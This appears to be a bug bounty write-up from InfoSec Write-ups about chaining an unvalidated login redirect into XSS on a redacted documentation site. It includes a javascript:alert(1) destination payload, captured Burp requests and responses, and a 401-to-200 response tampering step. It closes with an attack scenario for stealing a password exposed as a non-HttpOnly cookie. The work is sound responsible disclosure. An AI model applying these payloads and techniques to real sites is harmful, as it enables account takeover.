---
title: XSS: Demonstrating Impact Without Credentials
url: https://infosecwriteups.com/xss-demonstrating-impact-without-credentials-db7fff38792a?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-07-02
fetch_date: 2025-10-06T17:42:37.072953
---

# XSS: Demonstrating Impact Without Credentials

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fdb7fff38792a&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fxss-demonstrating-impact-without-credentials-db7fff38792a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fxss-demonstrating-impact-without-credentials-db7fff38792a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-db7fff38792a---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-db7fff38792a---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# XSS: Demonstrating Impact Without Credentials

[![Shlok K](https://miro.medium.com/v2/resize:fill:64:64/1*RAxpHU18kyc6wgAZLmvQGA.jpeg)](https://medium.com/%40pphreak313?source=post_page---byline--db7fff38792a---------------------------------------)

[Shlok K](https://medium.com/%40pphreak313?source=post_page---byline--db7fff38792a---------------------------------------)

5 min read

·

Jun 26, 2024

--

2

Listen

Share

Hello, fellow hackers and tech enthusiasts. In this write-up, I will demonstrate how I used a Layer 1 authentication bypass to showcase the impact of an XSS vulnerability, even when the program did not provide credentials for testing.

Let’s get started.

The program does not allow disclosure, so I am redacting the details. We’ll refer to the target as: `docs.redacted.com`. This was a public program on Bugcrowd with a very confined scope.

Press enter or click to view image in full size

![]()

Hacking within such a confined scope is challenging, but the program had zero accepted reports, which made it an enticing target for me.

I chose a random target from the six available and accessed it.

Press enter or click to view image in full size

![]()

It was a documentation page. I explored all the links and landed on this page:

`[https://docs.redacted.com/support](https://docs.redacted.com/support.)`[.](https://docs.redacted.com/support.)

Press enter or click to view image in full size

![]()

The best part was that the site was open source. As the saying goes, **“I can hack the world if I have the source code.”** ,

So, I got into analyzing the source code. It took time, but it was all worth it.

Here is the interesting code I found:

Press enter or click to view image in full size

![]()

Take a look at these lines:

```
if (!token || !(await validateFusionFeedToken(token))) {
            return {
                redirect: {
                    destination: '/login#destination=' + encodeURIComponent(dest),
                    permanent: false,
                },
            };
        }
```

If the supplied token value is correct, it redirects the user to the destination, which is specified in the GET parameter as `/login#destination=`.

There is no input validation for the destination value, confirming a P4 vulnerability "Open Redirect" in this domain.

However, this is an action-specific vulnerability.

Hence, even for the Open redirect, we will need the credentials or the token value to at least pass the function for the redirection to take place. However, the program had no credentials provided. I did reach out to the tech support of the domain and they said :

Press enter or click to view image in full size

![]()

:/ . Nvm, I respect the company’s policy.

Let's get back to the open redirect.

The chain of open redirects can lead to a very effective XSS attack. Using the `javascript:` URI, we can supply arbitrary JavaScript that will be executed when the user logs in.

For example, `javascript:alert(1)` would pop an alert box saying "1".

I accessed the URL to make a final attempt to bypass the login and prove the impact:

URL : <https://docs.redacted.com/login#destination=javascript:alert(1)>

Press enter or click to view image in full size

![]()

I entered random credentials and captured the request using Burp.

```
POST /v2/graphql HTTP/2
Host: xxx.xxxx.redacted.com
Content-Length: 12
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Content-Type: application/graphql
Sec-Ch-Ua-Mobile: ?0
Authorization: token abcd
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: /
Origin: https://docs.redacted.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://docs.redacted.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Dnt: 1
Sec-Gpc: 1
Priority: u=1, i

{__typename}
```

A GraphQL POST request was being made to a different subdomain and our supplied credential was being parsed as an Authorization Token value. E.g.; abcd in this case.

Response:

```
HTTP/2 401 Unauthorized
Date: Sat, 15 Jun 2024 18:48:30 GMT
Content-Type: application/json
Content-Length: 64
Cf-Ray: 8944bc11abef9a78-NAG Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: *
Cache-Control: max-age=1
Vary: Accept-Encoding, Authorization
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Server: cloudflare
{"message":"You are not authorized to perform this operation."}
```

So we got a 401 Unauthorized error.

The best and the only thing I could try at this point was to change the Response code from 401 to 200. New response:

```
HTTP/2 200 OK
Date: Sat, 15 Jun 2024 18:48:30 GMT
Content-Type: application/json
Content-Length: 64
Cf-Ray: 8944bc11abef9a78-NAG
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Origin: *
Cache-Control: max-age=1
Vary: Accept-Encoding, Authorization
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Server: cloudflare

{"message":"You are not authorized to perform this operation."}
```

And it did work. The XSS was executed.

Press enter or click to view image in full size

![]()

Further analysis led me to discover that the supplied authorization token value or the pass supplied was being passed as the cookie value and the HTTP-only flag was not set.

Attack scenario :

```
1. The malicious URL would be sent to the victim.
2. The victim logs in with the correct pass and the XSS gets executed.
3. Since the password is directly being passed on as a cookie value,
   the attacker will use the cookie value as the pass and log into the victim's account.
```

I created a well-written report and was paid $$$ + 10 points for the finding. Also, I was the first Hall of Fame of the program. 😈

Press enter or click to view image in full size

![]()

Until the next time, keep growing, keep hacking.

Bye!

[Bug Bo...